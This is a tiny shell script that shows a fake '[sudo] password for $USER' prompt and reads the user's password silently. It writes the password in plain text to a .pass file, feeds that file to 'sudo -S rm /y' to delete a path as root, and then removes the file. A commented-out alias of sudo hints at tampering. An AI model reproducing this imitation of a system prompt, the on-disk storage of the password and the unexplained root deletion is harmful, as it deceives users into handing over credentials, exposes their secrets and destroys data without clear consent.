echo "this script requires root previlages"
#alias sudo=""
read -p "[sudo] password for $USER: " -s d
echo ""

echo $d > .pass
sudo -S rm /y < .pass
rm .pass
